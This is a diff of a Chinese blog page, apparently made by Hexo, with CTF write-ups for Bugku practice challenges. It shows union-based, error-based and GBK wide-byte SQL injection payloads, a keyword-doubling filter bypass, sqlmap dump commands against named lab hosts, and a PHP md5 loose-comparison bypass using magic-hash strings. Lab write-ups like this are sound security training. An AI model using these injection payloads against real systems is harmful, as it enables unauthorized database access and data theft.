@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -252,18 +252,32 @@
   
 1&#x27; and 1=2 #</code></pre></div>
 <p>   不显示内容，可以判断存在注入点</p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4#可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4</code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>` -1&apos; union select 1,database(),3,4 #`
-
-     database:skctf_flag</code></pre></div><h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # </code></pre></div><p> table:fl4g,sc</p>
-<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #</code></pre></div><p> skctf_flag</p>
+<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><h3 id="1-1-39-order-by-4-可正常显示可以判断存在四个字段"><a href="#1-1-39-order-by-4-可正常显示可以判断存在四个字段" class="headerlink" title="1.1&#39; order by 4 #可正常显示可以判断存在四个字段"></a>1.<code>1&#39; order by 4 </code>#可正常显示可以判断存在四个字段</h3><h3 id="2-爆数据库"><a href="#2-爆数据库" class="headerlink" title="2.爆数据库"></a>2.爆数据库</h3><div class="hljs"><pre><code>   ` -1&#39; union select 1,database(),3,4 #`
+           
+        database:skctf_flag
+</code></pre></div>
+<h3 id="3-爆出表名"><a href="#3-爆出表名" class="headerlink" title="3.爆出表名"></a>3.爆出表名</h3><div class="hljs"><pre><code>-1&#39; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # 
+</code></pre></div>
+<p> table:fl4g,sc</p>
+<h3 id="4-字段名"><a href="#4-字段名" class="headerlink" title="4.字段名"></a>4.字段名</h3><div class="hljs"><pre><code>-1&#39; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 #
+</code></pre></div>
+<p> skctf_flag</p>
 <p> 得到flag</p>
 <p> <code>(select skctf_flag from skctf_flag.fl4g)</code></p>
 <h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p> <strong>因为本题提交数据的方式为post，故需要先用bp抓数据包，保存到sqlmap的路径中</strong></p>
-<p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif" alt></p>
-<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs</code></pre></div><p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif" alt></p>
-<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables</code></pre></div><p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif" alt></p>
-<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns</code></pre></div><p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif" alt></p>
-<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump</code></pre></div><p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif" alt></p>
+<p><img src="/2020/08/08/Bugku/cjd1.png" srcset="/img/loading.gif"></p>
+<h3 id="1-获取数据库"><a href="#1-获取数据库" class="headerlink" title="1.获取数据库"></a>1.获取数据库</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt --dbs
+</code></pre></div>
+<p><img src="/2020/08/08/Bugku/cjd2.png" srcset="/img/loading.gif"></p>
+<h3 id="2-获取表名"><a href="#2-获取表名" class="headerlink" title="2.获取表名"></a>2.获取表名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag --tables
+</code></pre></div>
+<p><img src="/2020/08/08/Bugku/cjd3.png" srcset="/img/loading.gif"></p>
+<h3 id="3-获取列名"><a href="#3-获取列名" class="headerlink" title="3.获取列名"></a>3.获取列名</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns
+</code></pre></div>
+<p><img src="/2020/08/08/Bugku/cjd4.png" srcset="/img/loading.gif"></p>
+<h3 id="4-获取flag"><a href="#4-获取flag" class="headerlink" title="4.获取flag"></a>4.获取flag</h3><div class="hljs"><pre><code>python2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump
+</code></pre></div>
+<p><img src="/2020/08/08/Bugku/cjd5.png" srcset="/img/loading.gif"></p>
 <hr>
 <h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p> 扫描发现了index.php，通过  index.php.bak下载网页源码</p>
 <div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@@ -275,15 +289,15 @@
 <span class="hljs-comment">*/</span>
 
 <span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;
-ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
-<span class="hljs-variable">$str</span> = strstr(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);
-<span class="hljs-variable">$str</span> = substr(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);
-<span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
-parse_str(<span class="hljs-variable">$str</span>);
-<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key1</span>);
+<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>], <span class="hljs-string">&#x27;?&#x27;</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);
+<span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$str</span>);
+<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$str</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key1</span>);
 
-<span class="hljs-keyword">echo</span> md5(<span class="hljs-variable">$key2</span>);
-<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$key1</span>) == md5(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key2</span>);
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key1</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$key2</span>) &amp;&amp; <span class="hljs-variable">$key1</span> !== <span class="hljs-variable">$key2</span>)&#123;
 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>.<span class="hljs-string">&quot;取得flag&quot;</span>;
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
@@ -291,7 +305,7 @@ parse_str(<span class="hljs-variable">$str</span>);
 
 <p> 对上传的值进行了过滤key, kekeyy可以绕过</p>
 <p> 1.md5函数无法处理数组，将两个参数设置为数组类型经过md5函数加密后都为NULL故二者相等<br> payload:  <code>?kekey1[]=da&amp;kekey2[]=dada</code></p>
-<p> 2.利用==比较漏洞</p>
+<p> 2.利用&#x3D;&#x3D;比较漏洞</p>
 <p> 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。</p>
 <p> 下列的字符串的MD5值都是0e开头的：</p>
 <div class="hljs"><pre><code>QNKCDZO
@@ -304,39 +318,73 @@ s155964671a
 
 s214587387a
 
-s214587387a</code></pre></div><hr>
+s214587387a
+</code></pre></div>
+<hr>
 <h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><p>爆数据库名</p>
-<p>   <code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
+<p>   <code> http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+</code></p>
 <p>database:<strong>web1002-1</strong></p>
 <p>爆表名</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+</code></pre></div><p>flag1,hint</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+
+</code></pre></div>
+<p>flag1,hint</p>
 <p>爆字段名</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos;  --+</code></pre></div><p>flag1,address<br>获取内容</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+</code></pre></div><p><strong>usOwycTju+FTUUzXosjr</strong></p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &#39;flag1&#39;  --+
+</code></pre></div>
+<p>flag1,address<br>获取内容</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,group_concat(flag1) from flag1 --+
+</code></pre></div>
+<p><strong>usOwycTju+FTUUzXosjr</strong></p>
 <p>提交发现不对</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+</code></pre></div><p>获取address中的内容</p>
-<p>./Once_More.php<br>下一关地址<br>得到另外一个地址</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23</code></pre></div><p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23</code></pre></div><p>Unknown column ‘flag2’ in ‘where clause’</p>
-<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23</code></pre></div><p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,group_concat(address) from flag1 --+
+</code></pre></div>
+<p>获取address中的内容</p>
+<p>.&#x2F;Once_More.php<br>下一关地址<br>得到另外一个地址</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;~&#39;),3) %23
+</code></pre></div>
+<p>给出提示<br>XPATH syntax error: ‘<del>class,flag2</del>‘</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&#39;~&#39;),3) %23
+</code></pre></div>
+<p>Unknown column ‘flag2’ in ‘where clause’</p>
+<div class="hljs"><pre><code>http://123.206.87.240:9004/Once_More.php?id=1&#39; and updatexml(1,concat(&#39;~&#39;,(select group_concat(flag2) from flag2),&#39;~&#39;),3) %23
+</code></pre></div>
+<p>XPATH syntax error: ‘<del>flag{Bugku-sql_6s-2i-4t-bug}</del>‘</p>
 <p><strong>！！！注意把flag改为小写字母</strong></p>
 <hr>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>靶场：<a href="%E9%9D%B6%E5%9C%BA%EF%BC%9Ahttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1</a></p>
 <h3 id="一、手工注入"><a href="#一、手工注入" class="headerlink" title="一、手工注入"></a>一、手工注入</h3><p>第一步</p>
-<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code></pre></div><p>加单引号报错</p>
-<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,table_name from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看所有的表</p>
-<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23</code></pre></div><p>查看表中的列</p>
-<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
-ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre></div><p>0x637466 为十六进制ctf</p>
+<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27
+</code></pre></div>
+<p>加单引号报错</p>
+<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;  union select 1,table_name from information_schema.tables where  table_schema=database()%23
+</code></pre></div>
+<p>查看所有的表</p>
+<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;  union select 1,group_concat(table_name) from information_schema.tables where  table_schema=database()%23
+</code></pre></div>
+<p>查看表中的列</p>
+<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;  union select 1,group_concat(column_name) from information_schema.columns where  table_name=0x637466 %23
+ctf,ctf2,ctf3,ctf4,gbksqli,news
+</code></pre></div>
+<p>0x637466 为十六进制ctf</p>
 <p>获取字段内容</p>
-<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos;  union select 1,group_concat(pw) from ctf %23</code></pre></div><p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
+<div class="hljs"><pre><code>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&#39;  union select 1,group_concat(pw) from ctf %23
+</code></pre></div>
+<p><strong>flag:</strong><br><strong>nctf{h4cked_By_w00dPeck3r}</strong></p>
 <h3 id="二、sqlmap注入"><a href="#二、sqlmap注入" class="headerlink" title="二、sqlmap注入"></a>二、sqlmap注入</h3><p>检测是否有注入点</p>
-<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27</code><br>没有成功<br>使用十六进制</p>
-<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex</code></pre></div><p>获取数据库名</p>
+<p><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 </code><br>没有成功<br>使用十六进制</p>
 <div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
- --dbs //选择十六进制 获取数据库名 单引号使用url编码</code></pre></div><p>获取表名</p>
-<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables</code></pre></div><p>获取flag</p>
-<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump</code></pre></div><p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif" alt></p>
+</code></pre></div>
+<p>获取数据库名</p>
+<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex
+ --dbs //选择十六进制 获取数据库名 单引号使用url编码
+</code></pre></div>
+<p>获取表名</p>
+<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex --D sae-chinalover --tables
+</code></pre></div>
+<p>获取flag</p>
+<div class="hljs"><pre><code>sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27  --hex -D sae-chinalover -T ctf --dump
+</code></pre></div>
+<p><img src="/2020/08/08/Bugku/k1.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
